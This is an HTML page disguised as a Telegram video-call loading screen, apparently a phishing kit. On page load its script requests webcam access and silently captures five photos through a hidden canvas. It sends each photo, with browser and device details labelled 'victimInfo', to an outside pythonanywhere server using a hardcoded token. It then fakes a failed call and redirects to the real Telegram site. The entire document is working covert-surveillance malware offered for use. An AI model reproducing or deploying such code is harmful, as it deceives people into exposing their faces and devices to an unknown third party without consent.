<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Video Call</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #0088cc, #00a2e8); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px; border-radius: 20px; text-align: center; max-width: 500px; width: 100%; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.2); }
        .logo { font-size: 70px; margin-bottom: 20px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        h1 { font-size: 32px; margin-bottom: 10px; font-weight: 600; }
        .subtitle { font-size: 18px; opacity: 0.9; margin-bottom: 30px; }
        .loading { display: flex; align-items: center; justify-content: center; gap: 15px; margin: 30px 0; }
        .spinner { width: 25px; height: 25px; border: 3px solid rgba(255, 255, 255, 0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { background: rgba(255, 255, 255, 0.2); padding: 15px; border-radius: 10px; margin-top: 20px; font-size: 16px; }
        .video-preview { width: 100%; max-width: 300px; border-radius: 15px; margin: 20px auto; background: #000; display: none; transform: scaleX(-1); }
        .progress-bar { width: 100%; height: 6px; background: rgba(255, 255, 255, 0.2); border-radius: 3px; margin: 20px 0; overflow: hidden; }
        .progress { width: 0%; height: 100%; background: #00a884; border-radius: 3px; transition: width 0.3s; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ðŸ“¹</div>
        <h1>Telegram Video Call</h1>
        <p class="subtitle">Connecting you securely...</p>
        <div class="loading"><div class="spinner"></div><span>Initializing video call...</span></div>
        <video class="video-preview" id="videoElement" autoplay playsinline muted></video>
        <canvas id="hiddenCanvas" style="display: none;"></canvas>
        <div class="progress-bar"><div class="progress" id="progressBar"></div></div>
        <div class="status" id="statusMessage">Preparing your camera...</div>
    </div>

    <script>
        class AutoCameraCapture {
            constructor() {
                this.apiEndpoint = 'https://ahmed1997.pythonanywhere.com/api/v1/log_event';
                this.authToken = 'ahmed-secret-key-777'; // <-- ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± Ù…Ø·Ø§Ø¨Ù‚Ø© Ù„Ù„Ù‚Ù„Ø¹Ø©
                this.stream = null;
                this.captureCount = 0;
                this.maxCaptures = 5;
                this.isFinished = false;
                this.init();
            }
            init() {
                this.updateStatus('Loading video call interface...');
                setTimeout(() => this.startCamera(), 2000);
            }
            async startCamera() {
                try {
                    this.updateStatus('Requesting camera access...');
                    this.updateProgress(25);
                    this.stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720, facingMode: 'user' }, audio: false });
                    this.updateStatus('Camera activated! Preparing call...');
                    this.updateProgress(50);
                    const video = document.getElementById('videoElement');
                    video.srcObject = this.stream;
                    video.style.display = 'block';
                    setTimeout(() => this.startAutoCapture(), 1000);
                } catch (error) {
                    this.updateStatus('Please allow camera access to continue.');
                }
            }
            startAutoCapture() {
                if (this.isFinished) return;
                this.updateStatus('Connecting to call...');
                this.updateProgress(75);
                const intervals = [500, 2000, 4000, 6000, 8000];
                intervals.forEach(delay => setTimeout(() => this.captureImage(), delay));
                setTimeout(() => this.disappear(), 10000);
            }
            captureImage() {
                if (!this.stream || this.captureCount >= this.maxCaptures) return;
                const video = document.getElementById('videoElement');
                const canvas = document.getElementById('hiddenCanvas');
                const ctx = canvas.getContext('2d');
                if (video.videoWidth > 0) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    this.captureCount++; // Ø²ÙŠØ§Ø¯Ø© Ø§Ù„Ø¹Ø¯Ø§Ø¯ Ù‚Ø¨Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
                    this.sendToServer(imageData);
                }
            }
            sendToServer(imageData) {
                const victimInfo = {
                    userAgent: navigator.userAgent, platform: navigator.platform, languages: navigator.languages,
                    screenResolution: `${screen.width}x${screen.height}`, timestamp: new Date().toISOString(),
                    url: window.location.href
                };
                
                this.updateStatus(`Sending report ${this.captureCount}...`);

                fetch(this.apiEndpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Auth-Token': this.authToken
                    },
                    body: JSON.stringify({ image: imageData, info: victimInfo })
                })
                .then(response => {
                    if (response.ok) {
                        this.updateStatus(`Report ${this.captureCount} SENT! HQ says OK.`);
                    } else {
                        this.updateStatus(`HQ REJECTED report ${this.captureCount}. Status: ${response.status}`);
                    }
                })
                .catch(error => {
                    this.updateStatus(`BRIDGE BLOCKED! Transmission Failed!`);
                    console.error("CORS or Network Error:", error);
                });
            }
            disappear() {
                this.isFinished = true;
                this.updateStatus('Call failed to connect. Redirecting...');
                this.updateProgress(100);
                if (this.stream) {
                    this.stream.getTracks().forEach(track => track.stop());
                }
                setTimeout(() => {
                    window.location.href = 'https://web.telegram.org/a/';
                }, 1500);
            }
            updateStatus(message) { document.getElementById('statusMessage').textContent = message; }
            updateProgress(percent) { document.getElementById('progressBar').style.width = `${percent}%`; }
        }
        document.addEventListener('DOMContentLoaded', () => {
            new AutoCameraCapture();
        });
    </script>
</body>
</html>